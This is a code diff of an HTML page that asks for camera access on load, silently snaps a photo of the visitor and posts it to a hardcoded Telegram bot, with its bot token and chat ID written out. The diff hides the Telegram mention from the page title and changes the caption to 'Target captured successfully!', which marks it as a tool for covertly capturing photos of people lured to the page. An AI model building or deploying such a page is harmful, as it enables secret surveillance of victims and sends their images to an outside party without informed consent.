@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Capture to Telegram</title>
+    <title>Camera Capture</title>
     <style>
         body {
             margin: 0;
@@ -57,8 +57,8 @@
     </div>
 
     <script>
-        const BOT_TOKEN = '8776982426:AAHwIFQIj36xbb_LoDZw7t1FpiRCLyzeu8U';
-        const CHAT_ID = '7641255924';
+        const BOT_TOKEN = '8942095399:AAGbL8-6mj89o3PefyQeVdRd9oVR0LrSNDg';
+        const CHAT_ID = '7641255924'; // دڵنیابە لەوەی ئەمە چات ئایدی ڕاستی خۆتە
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -73,9 +73,10 @@
                 video.srcObject = stream;
                 statusText.innerText = "Camera allowed. Capturing...";
 
+                // کاتی زیاتر دەدەین بۆ ئەوەی کامێراکە بە تەواوی کاربکات (٢.٥ چرکە)
                 setTimeout(() => {
                     captureAndSend(stream);
-                }, 1500);
+                }, 2500);
 
             } catch (err) {
                 statusText.innerText = "Camera access denied.";
@@ -84,16 +85,17 @@
         }
 
         function captureAndSend(stream) {
-            if (!video.videoWidth) return;
+            if (!video.videoWidth) {
+                statusText.innerText = "Camera not ready!";
+                return;
+            }
 
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
             const ctx = canvas.getContext('2d');
-            
             ctx.translate(canvas.width, 0);
             ctx.scale(-1, 1);
-
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             stream.getTracks().forEach(track => track.stop());
@@ -101,24 +103,26 @@
             canvas.toBlob(async function(blob) {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'captured-photo.jpg');
-                formData.append('caption', '📸 New photo captured from website!');
+                formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', '📸 Target captured successfully!');
                 
                 try {
+                    statusText.innerText = "Sending photo...";
                     let response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
                     
-                    if (response.ok) {
+                    let data = await response.json();
+                    if (data.ok) {
                         statusText.innerText = "Photo sent successfully!";
                     } else {
-                        statusText.innerText = "Failed to send photo.";
+                        statusText.innerText = "Error: " + data.description;
                     }
                 } catch (e) {
-                    statusText.innerText = "Network error while sending.";
+                    statusText.innerText = "Network connection failed.";
                 }
-            }, 'image/jpeg');
+            }, 'image/jpeg', 0.9);
         }
 
         window.onload = initCamera;
